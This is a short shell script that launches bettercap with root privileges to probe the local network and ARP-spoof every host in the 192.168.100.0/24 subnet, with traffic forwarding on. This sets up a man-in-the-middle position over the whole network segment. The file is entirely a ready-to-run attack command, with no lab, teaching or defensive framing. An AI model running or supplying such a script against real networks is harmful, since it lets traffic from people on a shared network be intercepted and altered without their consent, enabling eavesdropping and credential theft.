#!/bin/sh
sudo bettercap -iface wlo1 -eval "net.probe on; set arp.spoof.targets 192.168.100.0/24; set arp.spoof.forward true; arp.spoof on"
